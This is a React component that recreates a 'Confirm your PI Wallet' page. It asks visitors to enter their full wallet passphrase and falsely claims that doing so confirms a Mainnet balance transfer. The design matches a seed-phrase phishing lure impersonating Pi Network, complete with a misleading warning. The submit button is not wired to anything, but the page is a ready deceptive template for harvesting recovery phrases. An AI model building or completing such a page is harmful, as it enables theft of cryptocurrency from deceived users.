import React, { useState } from 'react';
import styled from 'styled-components';
import piLogo from './logo.png';

const Container = styled.div`
  max-width: 100%;
  min-height: 100vh;
  padding: 20px;
  background-color: #fff;
  margin: 0 auto;
  max-width: 600px;
`;

const Header = styled.header`
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 10px 0;
  border-bottom: 1px solid #eee;
  margin-bottom: 30px;
  position: relative;
`;

const BackButton = styled.button`
  background: none;
  border: none;
  font-size: 24px;
  cursor: pointer;
  position: absolute;
  left: 0;
`;

const Logo = styled.div`
  height: 40px;
  width: 40px;
  margin: 0 auto;
  display: flex;
  align-items: center;
  justify-content: center;
`;

const PiLogoSVG = () => (
  <svg width="40" height="40" viewBox="0 0 100 100">
    <circle cx="50" cy="50" r="45" fill="#FFA500" />
    <text
      x="50"
      y="65"
      textAnchor="middle"
      fill="white"
      fontSize="50"
      fontWeight="bold"
      fontFamily="Arial"
    >
      π
    </text>
  </svg>
);

const Title = styled.h1`
  font-size: 24px;
  text-align: center;
  margin-bottom: 20px;
`;

const Description = styled.p`
  font-size: 16px;
  text-align: left;
  margin-bottom: 20px;
`;

const Warning = styled.p`
  color: red;
  font-size: 14px;
  margin-bottom: 20px;
`;

const TextArea = styled.textarea`
  width: 100%;
  height: 200px;
  padding: 15px;
  border: 1px solid #ddd;
  border-radius: 8px;
  margin-bottom: 20px;
  font-size: 14px;
  resize: none;
`;

const ConfirmButton = styled.button`
  width: 100%;
  padding: 15px;
  background-color: #8e44ad;
  color: white;
  border: none;
  border-radius: 8px;
  font-size: 16px;
  cursor: pointer;
  margin-bottom: 20px;

  &:hover {
    background-color: #7d3c98;
  }
`;

const LostPassphrase = styled.p`
  text-align: center;
  font-size: 14px;
  color: #666;
`;

function App() {
  const [passphrase, setPassphrase] = useState('');

  return (
    <Container>
      <Header>
        <BackButton>←</BackButton>
        <Logo>
          <PiLogoSVG />
        </Logo>
      </Header>

      <Title>Confirm your PI Wallet</Title>

      <Description>
        Manually unlock the wallet using your passphrase to demonstrate you can access it. 
        This also confirms that your Mainnet balance will transfer to this wallet.
      </Description>

      <Warning>
        Never enter your passphrase on any other arbitrary page.
      </Warning>

      <TextArea
        placeholder="e.g. alpha bravo charlie delta echo foxtrot golf hotel india juliet kilo lima mike november oscar papa quebec romeo sierra tango uniform victor whiskey xray"
        value={passphrase}
        onChange={(e) => setPassphrase(e.target.value)}
      />

      <ConfirmButton>
        CONFIRM YOUR WALLET
      </ConfirmButton>

      <LostPassphrase>
        Lost passphrase? Create a new wallet here and return to confirm the new wallet.
      </LostPassphrase>
    </Container>
  );
}

export default App;
